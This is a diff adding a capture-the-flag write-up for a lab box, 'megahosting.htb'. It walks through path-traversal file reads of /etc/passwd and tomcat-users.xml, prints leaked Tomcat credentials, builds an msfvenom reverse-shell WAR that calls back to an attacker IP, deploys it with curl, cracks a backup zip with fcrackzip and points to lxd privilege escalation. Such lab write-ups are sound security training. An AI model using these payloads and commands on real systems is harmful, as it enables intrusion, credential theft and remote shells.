@@ -1,0 +1,49 @@
+sales@megahosting.com
+01234 5678910
+
+Open the site in a browser, have a look at the information and you should see something that shows you a thing you can exploit manually. This will allow you get information you need to access the thing the box name alludes to. From here you can work out how to fuzz the information you need to get actual access.
+
+Then its a fairly simple attack to put something you can use in a place you can use it and get a low priv shell on the box.
+
+I don't know if any CVE is needed here.
+
+
+* First we need to add hosts to the machine *
+
+* Then we can see http://megahosting.htb/news.php?file=../../../../../etc/passwd gets as the file *
+
+* I installed Tomcat locally to better be able to look through file *
+  
+  A thing to notice is the we need to install tomcat9 with "sudo apt-get install tomcat9" because
+  doing the installation manually will differ from the one on the server
+
+  After some pocking around we find the tomcat-users.xml using the exploit
+  http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
+ 
+   <role rolename="admin-gui"/>
+   <role rolename="manager-script"/>
+   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
+
+   using this credentials we can access the host-manager
+
+* Create war payload *
+   msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.159 LPORT=7474 -f WAR > raf.war
+
+* Upload to server * 
+
+  curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file raf.war http://megahosting.htb:8080/manager/text/deploy?path=/raf
+
+
+* After enumaration an encrypted backup file was found in the /var/www/html/files dir *
+
+  A dictionary attack yeilds the password "admin@it"
+
+  fcrackzip -D -p /usr/share/wordlists/rockyou.txt -v backup.zip
+
+
+* Using the password we can su as user "ash" *
+
+* Our user is a part of the lxc group we can exploit that *
+ By following this https://www.hackingarticles.in/lxd-privilege-escalation/ 
+ And using https://github.com/initstring/lxd_root
+ 
